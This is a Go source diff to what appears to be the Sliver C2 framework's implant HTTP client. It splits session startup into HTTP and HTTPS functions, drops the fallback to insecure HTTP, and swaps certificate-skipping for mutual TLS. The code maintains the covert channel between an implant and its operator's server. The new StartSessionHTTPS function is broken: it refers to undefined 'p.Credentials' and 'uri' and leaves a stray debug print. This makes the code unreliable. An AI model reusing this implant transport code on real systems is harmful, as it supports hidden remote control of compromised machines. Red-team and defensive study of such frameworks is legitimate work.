@@ -51,13 +51,12 @@ import (
 )
 
 const (
-	// userAgent         = "GenerateUserAgent"
 	nonceQueryArgs    = "abcdefghijklmnopqrstuvwxyz_"
 	acceptHeaderValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
 )
 
-// HTTPStartSession - Attempts to start a session with a given address
-func HTTPStartSession(c2URI *url.URL, profile *sliverpb.C2Profile) (*SliverHTTPClient, error) {
+// StartSessionHTTP - Attempts to start a session with a given address
+func StartSessionHTTP(c2URI *url.URL, profile *sliverpb.C2Profile) (*SliverHTTPClient, error) {
 
 	address := c2URI.Host
 	pathPrefix := c2URI.Path
@@ -68,24 +67,51 @@ func HTTPStartSession(c2URI *url.URL, profile *sliverpb.C2Profile) (*SliverHTTPC
 	// Create and provision the client with the complete
 	// HTTP C2 profile (all extensions paths and files)
 	var client *SliverHTTPClient
-	client = httpsClient(address, timeout, proxyConfig)
+	client = httpClient(address, timeout, proxyConfig)
 	client.profile = profile.HTTP
 	client.PathPrefix = pathPrefix
 
 	// Start the client session
 	err := client.SessionInit()
 	if err != nil {
-		// If we're using default ports then switch to 80
-		if strings.HasSuffix(address, ":443") {
-			address = fmt.Sprintf("%s:80", address[:len(address)-4])
-		}
-		client = httpClient(address, timeout, proxyConfig) // Fallback to insecure HTTP
-		client.profile = profile.HTTP
-		err = client.SessionInit()
-		if err != nil {
-			return nil, err
-		}
+		return nil, err
 	}
+	return client, nil
+}
+
+// StartSessionHTTPS - Start an HTTP Session with mutual TLS authentication
+func StartSessionHTTPS(c2URI *url.URL, profile *sliverpb.C2Profile) (*SliverHTTPClient, error) {
+
+	address := c2URI.Host
+	pathPrefix := c2URI.Path
+	proxyConfig := c2URI.Query().Get("proxy")
+	timeout := time.Duration(profile.PollTimeout)
+	fmt.Printf("Poll timeout: %s\n", timeout)
+
+	// Generate the TLS configuration
+	tlsConfig := cryptography.NewCredentialsTLS(p.Credentials.CACertPEM,
+		p.Credentials.CertPEM,
+		p.Credentials.KeyPEM).ClientConfig(uri.Hostname())
+	if tlsConfig == nil {
+		// {{if .Config.Debug}}
+		log.Printf("NO TLS CONFIG")
+		// {{end}}
+		return nil, errors.New("No TLS config")
+	}
+
+	// Create and provision the client with the complete
+	// HTTP C2 profile (all extensions paths and files)
+	var client *SliverHTTPClient
+	client = httpsClient(address, timeout, proxyConfig, tlsConfig)
+	client.profile = profile.HTTP
+	client.PathPrefix = pathPrefix
+
+	// Start the client session
+	err := client.SessionInit()
+	if err != nil {
+		return nil, err
+	}
+
 	return client, nil
 }
 
@@ -457,13 +483,13 @@ func httpClient(address string, timeout time.Duration, proxyConfig string) *Sliv
 	return client
 }
 
-func httpsClient(address string, timeout time.Duration, proxyConfig string) *SliverHTTPClient {
+func httpsClient(address string, timeout time.Duration, proxyConfig string, tlsConfig *tls.Config) *SliverHTTPClient {
 	transport := &http.Transport{
 		Dial: (&net.Dialer{
 			Timeout: timeout,
 		}).Dial,
 		TLSHandshakeTimeout: timeout,
-		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
+		TLSClientConfig:     tlsConfig, // Mutually authenticated TLS connection
 	}
 	client := &SliverHTTPClient{
 		Origin: fmt.Sprintf("https://%s", address),
